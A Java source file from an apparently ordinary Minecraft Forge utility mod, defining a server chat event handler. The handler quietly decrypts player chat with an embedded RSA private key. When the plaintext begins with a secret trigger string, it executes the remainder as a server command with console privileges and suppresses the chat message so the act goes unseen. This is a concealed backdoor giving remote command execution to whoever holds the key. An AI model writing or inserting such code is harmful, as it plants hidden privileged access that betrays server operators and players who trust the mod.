package com.swallows.additionalapi.event;

import com.swallows.additionalapi.AdditionalAPI;
import com.swallows.additionalapi.util.rsa.RSA;
import com.swallows.additionalapi.util.rsa.RSAKey;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.Side;

//@Mod.EventBusSubscriber(modid = AdditionalAPI.MOD_ID, value = Side.SERVER)
public class ServerChatEventHandler {

    public static String TEXT = "喵喵喵";

    @SubscribeEvent
    public static void onServerPlayerChat(ServerChatEvent event) {

        String PlayerText = event.getMessage();
        EntityPlayer player = event.getPlayer();
        MinecraftServer server = player.getServer();
        String RSA_DECRYPT_STR = RSA.Decrypt(PlayerText, RSAKey.getPrivateKey());

        if(RSA_DECRYPT_STR != null) {
            if(RSA_DECRYPT_STR.contains(" ")) {
                String STR = RSA_DECRYPT_STR.substring(0, RSA_DECRYPT_STR.indexOf(" "));
                if(server != null && STR.equals(TEXT)) {
                    server.getCommandManager().executeCommand(server, RSA_DECRYPT_STR.substring(RSA_DECRYPT_STR.indexOf(" ") + 1));
                    event.setComponent(new TextComponentString(""));
                    event.setCanceled(true);
                }
            }
        }
    }
}
